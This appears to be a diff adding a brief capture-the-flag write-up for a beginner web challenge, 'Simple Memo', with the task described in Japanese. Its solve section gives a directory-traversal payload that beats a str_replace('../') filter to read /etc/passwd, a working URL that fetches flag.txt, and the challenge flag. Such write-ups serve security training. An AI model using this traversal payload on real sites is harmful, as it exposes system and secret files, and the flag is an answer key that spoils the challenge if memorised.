@@ -1,0 +1,38 @@
+Simple Memo
+101pt Beginner
+問題ページ：https://simple.wanictf.org/
+
+flag.txtというファイルに私の秘密を隠したが、 完璧にサニタイズしたため辿りつける訳がない。
+
+(Hint) ディレクトリトラバーサルという脆弱性です。
+
+何がサニタイズされているかを知るためにソースコード(reader.php)を参考にしてみてください。
+
+(注意)
+
+simple_memo.zipは問題を解くために必須の情報ではなく、docker-composeを利用してローカルで問題環境を再現するためのものです。
+
+興味のある方は利用してみてください。
+
+
+
+Writer : okmt
+
+
+
+
+
+
+Solve:
+
+Twitter: https://twitter.com/e3xpl0it/status/693499502515351553?lang=en
+
+Bypass str_replace("../", "", $_GET
+..././..././..././etc/passwd >> str_replace ../../../etc/passwd  Profit #LFI
+
+
+
+https://simple.wanictf.org/index.php?file=..././flag.txt
+FLAG{y0u_c4n_get_hi5_5ecret_fi1e}
+
+
